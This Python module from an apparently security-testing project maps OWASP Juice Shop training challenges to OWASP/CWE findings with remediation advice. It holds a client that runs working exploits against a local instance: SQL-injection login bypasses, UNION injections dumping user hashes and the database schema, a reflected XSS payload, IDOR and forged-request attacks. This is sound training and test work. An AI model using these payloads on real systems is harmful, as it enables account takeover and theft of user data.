"""Client and challenge map for OWASP Juice Shop (the *security* target).

Juice Shop is a well-known, deliberately vulnerable web app. We attack a small, reliable
set of its training **challenges**, then confirm each one via its own API
(``GET /api/Challenges``, field ``solved``). A solved challenge is proof the vulnerability
is real, so we turn it into a :class:`~secureqa.findings.Finding`.
(TR: Juice Shop'un eğitim "challenge"larını çözüp /api/Challenges ile doğrularız;
çözülen her challenge bir güvenlik bulgusuna dönüşür.)

We only use documented, non-destructive training exploits against a *local* instance.
"""

from __future__ import annotations

import time
from dataclasses import dataclass
from urllib.parse import quote

import requests

from secureqa.findings import Finding


@dataclass(frozen=True)
class ChallengeInfo:
    """How one Juice Shop challenge maps to an OWASP/CWE finding (TR: challenge -> bulgu)."""

    key: str                 # stable Juice Shop challenge key, e.g. "loginAdminChallenge"
    name: str                # human name shown on the score board
    title_tr: str
    title_en: str
    severity: str
    owasp: str
    cwe: str
    remediation_tr: str
    remediation_en: str

    def finding(self, base_url: str, evidence: str, test_id: str = "") -> Finding:
        """Build a :class:`Finding` for this solved challenge."""
        return Finding(
            id=f"JS-{self.key}",
            title_tr=self.title_tr,
            title_en=self.title_en,
            severity=self.severity,
            owasp=self.owasp,
            cwe=self.cwe,
            url=f"{base_url}/#/score-board",
            evidence=evidence,
            remediation_tr=self.remediation_tr,
            remediation_en=self.remediation_en,
            description_tr=f"Juice Shop challenge '{self.name}' çözüldü — zafiyet doğrulandı.",
            description_en=f"Juice Shop challenge '{self.name}' was solved — the vulnerability is confirmed.",
            test_id=test_id,
        )


# The challenges we attack. Keys come from Juice Shop's data/static/challenges.yml and are
# stable across versions. (TR: Saldırdığımız challenge'lar — anahtarlar sürümler arası sabit.)
CHALLENGES: dict[str, ChallengeInfo] = {
    "loginAdminChallenge": ChallengeInfo(
        key="loginAdminChallenge",
        name="Login Admin",
        title_tr="SQL Enjeksiyonu ile Yönetici Girişi (Juice Shop)",
        title_en="SQL Injection Admin Login (Juice Shop)",
        severity="critical",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Giriş sorgularını parametreli yapın; girdiyi asla SQL metnine birleştirmeyin.",
        remediation_en="Use parameterized login queries; never concatenate input into SQL text.",
    ),
    "localXssChallenge": ChallengeInfo(
        key="localXssChallenge",
        name="DOM XSS",
        title_tr="DOM Tabanlı XSS (Juice Shop arama)",
        title_en="DOM-based XSS (Juice Shop search)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-79",
        remediation_tr="Kullanıcı girdisini DOM'a yazarken güvenli API'ler (textContent) ve çıktı kodlaması kullanın.",
        remediation_en="Use safe DOM APIs (textContent) and output encoding when writing user input to the DOM.",
    ),
    "directoryListingChallenge": ChallengeInfo(
        key="directoryListingChallenge",
        name="Confidential Document",
        title_tr="Gizli Belgeye Erişim (Juice Shop /ftp)",
        title_en="Confidential Document Access (Juice Shop /ftp)",
        severity="high",
        owasp="A02:2021-Cryptographic Failures",
        cwe="CWE-200",
        remediation_tr="Gizli dosyaları web kökünün dışında tutun ve erişimi yetkiyle sınırlayın.",
        remediation_en="Keep confidential files outside the web root and restrict access with authorization.",
    ),
    "errorHandlingChallenge": ChallengeInfo(
        key="errorHandlingChallenge",
        name="Error Handling",
        title_tr="Ayrıntılı Hata Mesajı İfşası (Juice Shop)",
        title_en="Verbose Error Disclosure (Juice Shop)",
        severity="medium",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-209",
        remediation_tr="Kullanıcıya genel hata sayfası gösterin; ayrıntıları yalnızca sunucu loguna yazın.",
        remediation_en="Show a generic error page; write details only to the server log.",
    ),
    "exposedMetricsChallenge": ChallengeInfo(
        key="exposedMetricsChallenge",
        name="Exposed Metrics",
        title_tr="Açıkta Bırakılan Metrik Ucu (Juice Shop /metrics)",
        title_en="Exposed Metrics Endpoint (Juice Shop /metrics)",
        severity="low",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-200",
        remediation_tr="İzleme uçlarını (/metrics) kimlik doğrulama ile koruyun veya dışarıya kapatın.",
        remediation_en="Protect monitoring endpoints (/metrics) with authentication or do not expose them.",
    ),
    "adminSectionChallenge": ChallengeInfo(
        key="adminSectionChallenge",
        name="Admin Section",
        title_tr="Yönetici Bölümüne Erişim (Juice Shop)",
        title_en="Admin Section Access (Juice Shop)",
        severity="high",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-284",
        remediation_tr="Yönetici rotalarını sunucu tarafında rol kontrolüyle koruyun (sadece istemci gizleme yetmez).",
        remediation_en="Protect admin routes with server-side role checks (hiding them on the client is not enough).",
    ),
    # ---------------------------------------------------------------- A03 Injection (more)
    "loginBenderChallenge": ChallengeInfo(
        key="loginBenderChallenge",
        name="Login Bender",
        title_tr="SQL Enjeksiyonu ile Bender Hesabına Giriş (Juice Shop)",
        title_en="SQL Injection Login as Bender (Juice Shop)",
        severity="critical",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Giriş sorgularını parametreli hazırlayın; e-postayı SQL metnine birleştirmeyin.",
        remediation_en="Use parameterized login queries; do not concatenate the e-mail into SQL text.",
    ),
    "loginJimChallenge": ChallengeInfo(
        key="loginJimChallenge",
        name="Login Jim",
        title_tr="SQL Enjeksiyonu ile Jim Hesabına Giriş (Juice Shop)",
        title_en="SQL Injection Login as Jim (Juice Shop)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Giriş sorgularını parametreli hazırlayın; girdiyi doğrulayın.",
        remediation_en="Use parameterized login queries and validate input.",
    ),
    "unionSqlInjectionChallenge": ChallengeInfo(
        key="unionSqlInjectionChallenge",
        name="User Credentials",
        title_tr="UNION SQL Enjeksiyonu ile Kullanıcı Kimlik Bilgileri (Juice Shop)",
        title_en="User Credentials via UNION SQL Injection (Juice Shop)",
        severity="critical",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Parametreli sorgular kullanın; ürün aramasını kullanıcı tablosundan yalıtın.",
        remediation_en="Use parameterized queries; isolate product search from the user table.",
    ),
    "dbSchemaChallenge": ChallengeInfo(
        key="dbSchemaChallenge",
        name="Database Schema",
        title_tr="UNION SQL Enjeksiyonu ile Veritabanı Şeması İfşası (Juice Shop)",
        title_en="Database Schema Disclosure via UNION SQL Injection (Juice Shop)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-89",
        remediation_tr="Parametreli sorgular kullanın; hata ve sonuçlarda şema bilgisini sızdırmayın.",
        remediation_en="Use parameterized queries; never let results or errors leak the schema.",
    ),
    "reflectedXssChallenge": ChallengeInfo(
        key="reflectedXssChallenge",
        name="Reflected XSS",
        title_tr="Yansıtılmış XSS (Juice Shop sipariş takibi)",
        title_en="Reflected XSS (Juice Shop order tracking)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-79",
        remediation_tr="Yansıtılan parametreleri çıktı kodlamasıyla temizleyin; HTML bağlamına ham yazmayın.",
        remediation_en="Output-encode reflected parameters; never write them raw into an HTML context.",
    ),
    "xssBonusChallenge": ChallengeInfo(
        key="xssBonusChallenge",
        name="Bonus Payload",
        title_tr="DOM XSS Bonus Yükü (Juice Shop arama)",
        title_en="DOM XSS Bonus Payload (Juice Shop search)",
        severity="high",
        owasp="A03:2021-Injection",
        cwe="CWE-79",
        remediation_tr="Girdiyi güvenli olarak işaretlemeyin (bypassSecurityTrustHtml); çıktı kodlaması kullanın.",
        remediation_en="Do not mark input as trusted (bypassSecurityTrustHtml); rely on output encoding.",
    ),
    # ---------------------------------------------------------------- A01 Broken Access Control (more)
    "basketAccessChallenge": ChallengeInfo(
        key="basketAccessChallenge",
        name="View Basket",
        title_tr="Başka Kullanıcının Sepetine Erişim - IDOR (Juice Shop)",
        title_en="Access Another User's Basket - IDOR (Juice Shop)",
        severity="high",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-639",
        remediation_tr="Sepet uçlarında nesne sahipliğini sunucu tarafında doğrulayın (oturumdaki kullanıcı).",
        remediation_en="Enforce object ownership server-side on basket endpoints (the session user).",
    ),
    "redirectCryptoCurrencyChallenge": ChallengeInfo(
        key="redirectCryptoCurrencyChallenge",
        name="Outdated Allowlist",
        title_tr="Doğrulanmamış Yönlendirme - Açık Yönlendirme (Juice Shop)",
        title_en="Unvalidated Redirect - Open Redirect (Juice Shop)",
        severity="medium",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-601",
        remediation_tr="Yönlendirme hedeflerini sıkı bir izin listesiyle sınırlayın ve listeyi güncel tutun.",
        remediation_en="Restrict redirect targets with a strict allowlist and keep the list current.",
    ),
    "registerAdminChallenge": ChallengeInfo(
        key="registerAdminChallenge",
        name="Admin Registration",
        title_tr="Kayıt Sırasında Yetki Yükseltme - Admin Kaydı (Juice Shop)",
        title_en="Privilege Escalation at Registration - Admin Registration (Juice Shop)",
        severity="high",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-269",
        remediation_tr="İstemciden gelen 'role' alanını yok sayın; rolü yalnızca sunucu belirlesin.",
        remediation_en="Ignore any client-supplied 'role' field; assign roles only on the server.",
    ),
    "forgedFeedbackChallenge": ChallengeInfo(
        key="forgedFeedbackChallenge",
        name="Forged Feedback",
        title_tr="Başka Kullanıcı Adına Geri Bildirim (Juice Shop)",
        title_en="Forged Feedback on Behalf of Another User (Juice Shop)",
        severity="medium",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-639",
        remediation_tr="İstemciden gelen UserId'yi reddedin; sahibi oturumdaki kullanıcıdan alın.",
        remediation_en="Reject a client-supplied UserId; derive the owner from the session user.",
    ),
    "feedbackChallenge": ChallengeInfo(
        key="feedbackChallenge",
        name="Five-Star Feedback",
        title_tr="Başka Kullanıcının Geri Bildirimini Silme - IDOR (Juice Shop)",
        title_en="Delete Another User's Feedback - IDOR (Juice Shop)",
        severity="medium",
        owasp="A01:2021-Broken Access Control",
        cwe="CWE-639",
        remediation_tr="Silme işleminden önce kaydın sahibini yetkilendirin; yalnızca kimliği doğrulanmış olması yetmez.",
        remediation_en="Authorize the record owner before deletion; being authenticated alone is not enough.",
    ),
    # ---------------------------------------------------------------- A05 Security Misconfiguration (more)
    "scoreBoardChallenge": ChallengeInfo(
        key="scoreBoardChallenge",
        name="Score Board",
        title_tr="Gizli Skor Tablosunun Keşfi (Juice Shop)",
        title_en="Hidden Score Board Discovery (Juice Shop)",
        severity="low",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-200",
        remediation_tr="Gizlilikle güvenliğe güvenmeyin; yönetim sayfalarını yetkiyle koruyun.",
        remediation_en="Do not rely on security through obscurity; protect management pages with authorization.",
    ),
    "privacyPolicyChallenge": ChallengeInfo(
        key="privacyPolicyChallenge",
        name="Privacy Policy",
        title_tr="Gizlilik Politikası Sayfasına Doğrudan Erişim (Juice Shop)",
        title_en="Direct Access to the Privacy Policy Page (Juice Shop)",
        severity="info",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-200",
        remediation_tr="Bilgi amaçlı; yönlendirme kaynaklı sayfa keşfini bilinçli tasarlayın.",
        remediation_en="Informational; design page discovery via navigation deliberately.",
    ),
    "securityPolicyChallenge": ChallengeInfo(
        key="securityPolicyChallenge",
        name="Security Policy",
        title_tr="security.txt Güvenlik Politikası Dosyası (Juice Shop)",
        title_en="security.txt Security Policy File (Juice Shop)",
        severity="info",
        owasp="A05:2021-Security Misconfiguration",
        cwe="CWE-200",
        remediation_tr="security.txt sağlamak iyi uygulamadır; iletişim ve açıklama politikasını güncel tutun.",
        remediation_en="Providing security.txt is good practice; keep the contact and disclosure policy current.",
    ),
    # ---------------------------------------------------------------- A04 Insecure Design
    "emptyUserRegistration": ChallengeInfo(
        key="emptyUserRegistration",
        name="Empty User Registration",
        title_tr="Boş Kullanıcı Kaydı - İstemci Doğrulamasını Atlama (Juice Shop)",
        title_en="Empty User Registration - Bypassing Client Validation (Juice Shop)",
        severity="low",
        owasp="A04:2021-Insecure Design",
        cwe="CWE-20",
        remediation_tr="Doğrulamayı sunucuda da zorunlu kılın; boş e-posta/parolayı reddedin.",
        remediation_en="Enforce validation on the server too; reject empty e-mail/password.",
    ),
    "passwordRepeatChallenge": ChallengeInfo(
        key="passwordRepeatChallenge",
        name="Repetitive Registration",
        title_tr="Parola Tekrarı Doğrulaması Yok (Juice Shop kaydı)",
        title_en="Missing Password-Repeat Validation (Juice Shop registration)",
        severity="low",
        owasp="A04:2021-Insecure Design",
        cwe="CWE-20",
        remediation_tr="Parola ve tekrarının eşleştiğini sunucu tarafında doğrulayın.",
        remediation_en="Validate on the server that the password and its repeat match.",
    ),
    "zeroStarsChallenge": ChallengeInfo(
        key="zeroStarsChallenge",
        name="Zero Stars",
        title_tr="Sıfır Yıldızlı Geri Bildirim - İstemci Doğrulamasını Atlama (Juice Shop)",
        title_en="Zero-Star Feedback - Bypassing Client Validation (Juice Shop)",
        severity="low",
        owasp="A04:2021-Insecure Design",
        cwe="CWE-20",
        remediation_tr="Puan aralığını (1-5) sunucuda zorunlu kılın; istemci kontrolüne güvenmeyin.",
        remediation_en="Enforce the rating range (1-5) on the server; do not trust the client control.",
    ),
    # ---------------------------------------------------------------- A02 Cryptographic Failures (more)
    "weirdCryptoChallenge": ChallengeInfo(
        key="weirdCryptoChallenge",
        name="Weird Crypto",
        title_tr="Uygunsuz Kriptografi Kullanımı (Juice Shop - md5/base64)",
        title_en="Inappropriate Cryptography Usage (Juice Shop - md5/base64)",
        severity="medium",
        owasp="A02:2021-Cryptographic Failures",
        cwe="CWE-327",
        remediation_tr="Parola saklamada md5/base64 kullanmayın; bcrypt/argon2 gibi güçlü algoritmalar seçin.",
        remediation_en="Do not use md5/base64 for passwords; choose strong algorithms such as bcrypt/argon2.",
    ),
    # ---------------------------------------------------------------- A07 Authentication Failures
    "weakPasswordChallenge": ChallengeInfo(
        key="weakPasswordChallenge",
        name="Password Strength",
        title_tr="Zayıf Yönetici Parolası (Juice Shop - admin123)",
        title_en="Weak Administrator Password (Juice Shop - admin123)",
        severity="high",
        owasp="A07:2021-Identification and Authentication Failures",
        cwe="CWE-521",
        remediation_tr="Güçlü parola politikası uygulayın; varsayılan/zayıf parolaları yasaklayın.",
        remediation_en="Enforce a strong password policy; forbid default/weak passwords.",
    ),
}


class JuiceShopClient:
    """A thin HTTP client for a local Juice Shop instance (TR: yerel Juice Shop istemcisi)."""

    def __init__(self, base_url: str, session: requests.Session | None = None) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = session or requests.Session()

    # -------------------------------------------------- challenge status
    def challenges(self) -> list[dict]:
        """Return the list of challenges from ``GET /api/Challenges`` (``data`` field)."""
        response = self.session.get(self.base_url + "/api/Challenges", timeout=10)
        response.raise_for_status()
        return response.json().get("data", [])

    def challenge_by_key(self, key: str) -> dict | None:
        """Find one challenge dict by its stable key, or ``None``."""
        for challenge in self.challenges():
            if challenge.get("key") == key:
                return challenge
        return None

    def is_solved(self, key: str) -> bool:
        """True when the challenge with ``key`` is marked solved."""
        challenge = self.challenge_by_key(key)
        return bool(challenge and challenge.get("solved"))

    def disabled_env(self, key: str) -> str | None:
        """Environment name a challenge is disabled in, or ``None`` if it is active.

        Some Juice Shop challenges are intentionally switched off in certain
        deployments (``disabledEnv`` in ``challenges.yml``). For example the
        reflected-XSS challenge is disabled under ``Docker``/``Heroku``, so it can
        never be solved when Juice Shop runs as a Docker container — which is how
        CI (and most local ``docker run`` setups) start it.
        (TR: Bazı challenge'lar Docker gibi ortamlarda bilerek kapalıdır; o zaman çözülemez.)
        """
        challenge = self.challenge_by_key(key)
        value = challenge.get("disabledEnv") if challenge else None
        return value or None

    def wait_until_solved(self, key: str, timeout_s: float = 8.0) -> bool:
        """Poll ``/api/Challenges`` until the challenge is solved or the timeout passes.

        Juice Shop records a solve slightly asynchronously, so we give it a moment.
        (TR: Çözüm biraz gecikmeli kaydedilebilir; kısa süre bekleyip tekrar bakarız.)
        """
        deadline = time.monotonic() + timeout_s
        while time.monotonic() < deadline:
            if self.is_solved(key):
                return True
            time.sleep(0.5)
        return self.is_solved(key)

    def is_reachable(self) -> bool:
        """True when the instance answers (used to skip tests when it is not running)."""
        try:
            return self.session.get(self.base_url + "/rest/admin/application-version", timeout=4).ok
        except requests.RequestException:
            try:
                return self.session.get(self.base_url + "/", timeout=4).ok
            except requests.RequestException:
                return False

    # -------------------------------------------------- exploits (documented, non-destructive)
    def login_sqli(self, email_payload: str = "' OR 1=1--") -> tuple[bool, str]:
        """SQL-injection login bypass via ``POST /rest/user/login``.

        A successful bypass returns an ``authentication`` token in the JSON body.
        """
        response = self.session.post(
            self.base_url + "/rest/user/login",
            json={"email": email_payload, "password": "whatever"},
            timeout=10,
        )
        ok = response.status_code == 200 and "authentication" in response.text
        token = ""
        if ok:
            token = response.json().get("authentication", {}).get("token", "")[:24]
        evidence = f"POST /rest/user/login email={email_payload!r} -> HTTP {response.status_code}; " + (
            f"token received ({token}...)" if ok else "no token"
        )
        return ok, evidence

    def get_confidential_document(self) -> tuple[bool, str]:
        """Fetch the confidential document at ``/ftp/acquisitions.md`` (no auth)."""
        response = self.session.get(self.base_url + "/ftp/acquisitions.md", timeout=10)
        ok = response.status_code == 200 and "acquisition" in response.text.lower()
        evidence = f"GET /ftp/acquisitions.md -> HTTP {response.status_code}; {len(response.text)} bytes"
        return ok, evidence

    def get_metrics(self) -> tuple[bool, str]:
        """Fetch the Prometheus metrics endpoint at ``/metrics`` (should not be public)."""
        response = self.session.get(self.base_url + "/metrics", timeout=10)
        ok = response.status_code == 200 and "# HELP" in response.text
        evidence = f"GET /metrics -> HTTP {response.status_code}; starts: {response.text[:60]!r}"
        return ok, evidence

    def provoke_error(self) -> tuple[bool, str]:
        """Trigger an un-gracefully handled error by sending a wrong type to login.

        Sending ``email`` as an array makes the ORM throw, leaking an error body.
        """
        response = self.session.post(
            self.base_url + "/rest/user/login",
            json={"email": {"$ne": None}, "password": {"$ne": None}},
            timeout=10,
        )
        text = response.text.lower()
        ok = response.status_code >= 400 and ("error" in text or "sequelize" in text or "sql" in text)
        evidence = f"POST /rest/user/login with typed payload -> HTTP {response.status_code}; starts: {response.text[:80]!r}"
        return ok, evidence

    # -------------------------------------------------- auth helpers
    #: Default e-mail domain of Juice Shop's seeded users (config application.domain).
    DOMAIN = "juice-sh.op"

    def _auth_headers(self, token: str) -> dict[str, str]:
        """Return the ``Authorization: Bearer`` header for an authenticated request."""
        return {"Authorization": f"Bearer {token}"}

    def login(self, email: str, password: str = "password") -> dict | None:
        """POST ``/rest/user/login`` and return the ``authentication`` dict, or ``None``.

        The dict contains ``token`` (JWT), ``bid`` (basket id) and ``umail``.
        """
        try:
            response = self.session.post(
                self.base_url + "/rest/user/login",
                json={"email": email, "password": password},
                timeout=10,
            )
        except requests.RequestException:
            return None
        if response.status_code == 200 and "authentication" in response.text:
            return response.json().get("authentication")
        return None

    def admin_auth(self) -> dict | None:
        """Obtain an admin ``authentication`` dict via the classic SQLi bypass."""
        return self.login("' OR 1=1--", "whatever")

    # -------------------------------------------------- A03 Injection (more)
    def sqli_login_as(self, user_local_part: str) -> tuple[bool, str]:
        """SQLi login that targets a specific seeded user (e.g. ``"bender"``).

        The payload comments out the password check: ``bender@juice-sh.op'--``.
        """
        payload = f"{user_local_part}@{self.DOMAIN}'--"
        auth = self.login(payload, "whatever")
        ok = auth is not None
        evidence = f"POST /rest/user/login email={payload!r} -> " + (
            "token received" if ok else "no token"
        )
        return ok, evidence

    def union_sqli_user_credentials(self) -> tuple[bool, str]:
        """UNION-based SQLi on product search that exfiltrates user e-mails and hashes.

        The ``SELECT *`` column count varies slightly between versions, so we try a few
        counts and stop at the first one that returns user data.
        (TR: Sütun sayısı sürüme göre değişebildiğinden birkaç olasılığı deneriz.)
        """
        last = "no column count returned user data"
        for ncols in range(8, 13):
            columns = ["id", "email", "password"] + [f"'{i}'" for i in range(4, ncols + 1)]
            payload = "qwert')) UNION SELECT " + ", ".join(columns) + " FROM Users--"
            try:
                response = self.session.get(
                    self.base_url + "/rest/products/search",
                    params={"q": payload},
                    timeout=10,
                )
            except requests.RequestException:
                continue
            last = f"GET /rest/products/search q=<UNION {ncols} cols> -> HTTP {response.status_code}"
            if response.status_code == 200 and "@" + self.DOMAIN in response.text:
                return True, last + "; user e-mails and password hashes returned"
        return False, last

    def union_sqli_db_schema(self) -> tuple[bool, str]:
        """UNION-based SQLi on product search that dumps the SQLite schema."""
        last = "no column count returned the schema"
        for ncols in range(8, 13):
            columns = ["sql"] + [f"'{i}'" for i in range(2, ncols + 1)]
            payload = "qwert')) UNION SELECT " + ", ".join(columns) + " FROM sqlite_master--"
            try:
                response = self.session.get(
                    self.base_url + "/rest/products/search",
                    params={"q": payload},
                    timeout=10,
                )
            except requests.RequestException:
                continue
            last = f"GET /rest/products/search q=<UNION schema {ncols} cols> -> HTTP {response.status_code}"
            if response.status_code == 200 and "CREATE TABLE" in response.text:
                return True, last + "; table definitions returned"
        return False, last

    def reflected_xss_track_order(self) -> tuple[bool, str]:
        """Reflected XSS via the order-tracking id (reflected unencoded into the page)."""
        payload = '<iframe src="javascript:alert(`xss`)">'
        response = self.session.get(
            self.base_url + "/rest/track-order/" + quote(payload, safe=""),
            timeout=10,
        )
        ok = response.status_code in (200, 500)
        evidence = f"GET /rest/track-order/<xss payload> -> HTTP {response.status_code}"
        return ok, evidence

    # -------------------------------------------------- A01 Broken Access Control (more)
    def access_basket_idor(self) -> tuple[bool, str]:
        """Read a basket that is not ours by changing the id (IDOR)."""
        auth = self.admin_auth()
        if not auth:
            return False, "could not obtain a token via SQLi login"
        own_bid = auth.get("bid") or 1
        target = int(own_bid) + 1
        response = self.session.get(
            self.base_url + f"/rest/basket/{target}",
            headers=self._auth_headers(auth["token"]),
            timeout=10,
        )
        ok = response.status_code == 200
        evidence = f"GET /rest/basket/{target} (own bid={own_bid}) -> HTTP {response.status_code}"
        return ok, evidence

    def open_redirect_crypto(self) -> tuple[bool, str]:
        """Follow the unvalidated-redirect endpoint to an allowlisted crypto address."""
        target = "https://etherscan.io/address/0x0f933ab9fcaaa782d0279c300d73750e1311eae6"
        response = self.session.get(
            self.base_url + "/redirect",
            params={"to": target},
            allow_redirects=False,
            timeout=10,
        )
        ok = response.status_code in (301, 302, 303, 307, 308)
        evidence = f"GET /redirect?to={target} -> HTTP {response.status_code}"
        return ok, evidence

    def register_admin(self) -> tuple[bool, str]:
        """Register a new user that asks for the admin role (ignored server-side normally)."""
        email = f"attacker_{int(time.time() * 1000)}@secureqa.test"
        response = self.session.post(
            self.base_url + "/api/Users",
            json={"email": email, "password": "Password1!", "passwordRepeat": "Password1!", "role": "admin"},
            timeout=10,
        )
        ok = response.status_code in (200, 201)
        evidence = f"POST /api/Users role=admin email={email} -> HTTP {response.status_code}"
        return ok, evidence

    def register_empty_user(self) -> tuple[bool, str]:
        """Register with an empty e-mail and password (client validation bypassed)."""
        response = self.session.post(
            self.base_url + "/api/Users",
            json={"email": "", "password": "", "passwordRepeat": ""},
            timeout=10,
        )
        # The challenge is marked as soon as the request is seen, even if creation is rejected.
        evidence = f"POST /api/Users email='' password='' -> HTTP {response.status_code}"
        return True, evidence

    def register_password_mismatch(self) -> tuple[bool, str]:
        """Register with a password that does not match its repeat field."""
        email = f"mismatch_{int(time.time() * 1000)}@secureqa.test"
        response = self.session.post(
            self.base_url + "/api/Users",
            json={"email": email, "password": "Password1!", "passwordRepeat": "Different2!"},
            timeout=10,
        )
        evidence = f"POST /api/Users password!=passwordRepeat email={email} -> HTTP {response.status_code}"
        return True, evidence

    def get_captcha(self) -> tuple[int | None, str | None]:
        """Fetch a feedback CAPTCHA; Juice Shop conveniently returns the answer, too."""
        try:
            data = self.session.get(self.base_url + "/rest/captcha", timeout=10).json()
        except (requests.RequestException, ValueError):
            return None, None
        return data.get("captchaId"), data.get("answer")

    def forge_feedback(self) -> tuple[bool, str]:
        """Submit feedback on behalf of another user by setting ``UserId``.

        The forged-feedback check runs before the CAPTCHA check, so the challenge is
        marked even though the request itself is rejected for a wrong CAPTCHA.
        """
        response = self.session.post(
            self.base_url + "/api/Feedbacks",
            json={"comment": "forged by SecureQA", "rating": 1, "UserId": 2, "captchaId": 0, "captcha": "0"},
            timeout=10,
        )
        evidence = f"POST /api/Feedbacks UserId=2 -> HTTP {response.status_code} (forged-feedback check runs pre-CAPTCHA)"
        return True, evidence

    def delete_five_star_feedback(self) -> tuple[bool, str]:
        """Delete every 5-star feedback (any authenticated user may delete any feedback)."""
        auth = self.admin_auth()
        if not auth:
            return False, "could not obtain a token via SQLi login"
        headers = self._auth_headers(auth["token"])
        try:
            feedbacks = self.session.get(self.base_url + "/api/Feedbacks", timeout=10).json().get("data", [])
        except (requests.RequestException, ValueError):
            return False, "could not list /api/Feedbacks"
        targets = [f for f in feedbacks if f.get("rating") == 5]
        deleted = 0
        for feedback in targets:
            resp = self.session.delete(
                self.base_url + f"/api/Feedbacks/{feedback.get('id')}",
                headers=headers,
                timeout=10,
            )
            if resp.status_code in (200, 204):
                deleted += 1
        ok = bool(targets) and deleted == len(targets)
        evidence = f"DELETE 5-star feedback: found {len(targets)}, deleted {deleted}"
        return ok, evidence

    # -------------------------------------------------- A05 Security Misconfiguration (more)
    def get_security_policy(self) -> tuple[bool, str]:
        """Fetch the ``security.txt`` policy file (triggers the Security Policy challenge)."""
        response = self.session.get(self.base_url + "/security.txt", timeout=10)
        ok = response.status_code == 200 and "Contact" in response.text
        evidence = f"GET /security.txt -> HTTP {response.status_code}; {len(response.text)} bytes"
        return ok, evidence

    def access_padding_pixel(self, pixel: str) -> tuple[bool, str]:
        """Request a tracking-pixel asset whose path marks an access-control challenge.

        The server marks the matching challenge in middleware regardless of whether the
        asset itself exists, so any status is fine. (TR: piksel isteği challenge'ı işaretler.)
        """
        path = f"/assets/public/images/padding/{pixel}"
        response = self.session.get(self.base_url + path, timeout=10)
        evidence = f"GET {path} -> HTTP {response.status_code}"
        return True, evidence

    # -------------------------------------------------- A04 Insecure Design
    def submit_zero_star_feedback(self) -> tuple[bool, str]:
        """Submit feedback with a 0-star rating (the server does not enforce 1-5)."""
        captcha_id, answer = self.get_captcha()
        if captcha_id is None:
            return False, "could not obtain a CAPTCHA"
        response = self.session.post(
            self.base_url + "/api/Feedbacks",
            json={"comment": "zero stars by SecureQA", "rating": 0, "captchaId": captcha_id, "captcha": str(answer)},
            timeout=10,
        )
        ok = response.status_code in (200, 201)
        evidence = f"POST /api/Feedbacks rating=0 -> HTTP {response.status_code}"
        return ok, evidence

    # -------------------------------------------------- A02 Cryptographic Failures (more)
    def submit_weird_crypto_feedback(self) -> tuple[bool, str]:
        """Submit feedback naming a weak crypto algorithm (md5/base64) in the comment."""
        captcha_id, answer = self.get_captcha()
        if captcha_id is None:
            return False, "could not obtain a CAPTCHA"
        response = self.session.post(
            self.base_url + "/api/Feedbacks",
            json={
                "comment": "You should not use md5 or base64 to protect passwords.",
                "rating": 3,
                "captchaId": captcha_id,
                "captcha": str(answer),
            },
            timeout=10,
        )
        ok = response.status_code in (200, 201)
        evidence = f"POST /api/Feedbacks comment mentions md5/base64 -> HTTP {response.status_code}"
        return ok, evidence

    # -------------------------------------------------- A07 Authentication Failures
    def weak_admin_password_login(self) -> tuple[bool, str]:
        """Log in as admin with the weak, well-known password ``admin123``."""
        auth = self.login(f"admin@{self.DOMAIN}", "admin123")
        ok = auth is not None
        evidence = f"POST /rest/user/login admin@{self.DOMAIN}/admin123 -> " + (
            "token received" if ok else "no token"
        )
        return ok, evidence
